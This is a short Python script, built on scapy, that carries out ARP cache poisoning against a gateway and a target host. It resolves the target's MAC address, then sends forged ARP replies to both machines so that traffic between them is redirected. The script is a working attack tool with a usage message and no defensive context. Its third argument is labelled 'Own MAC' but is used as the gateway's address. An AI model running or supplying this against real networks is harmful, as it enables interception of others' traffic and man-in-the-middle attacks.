import sys
from scapy.all import *
from colorama import Fore
from colorama import Style

def help():
    print("Usage: arpspoof [Gateway IP] [Target IP] [Own MAC]")
    exit()

def get_Mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10,verbose=0)
    for s, r in resp:
        return r[ARP].hwsrc
    return None

if __name__ == '__main__':
    if sys.argv[1]=="-h":
        help()
    gateway_ip = sys.argv[1]
    target_ip = sys.argv[2]
    target_mac = get_Mac(target_ip)

    gateway_mac = sys.argv[3]

    print(Fore.YELLOW + " Target: " + target_ip + " ("+target_mac+")")
    print(Fore.GREEN + Style.BRIGHT + " Start Spoofing...:")
    for i in range(10):
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),verbose=0)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip),verbose=0)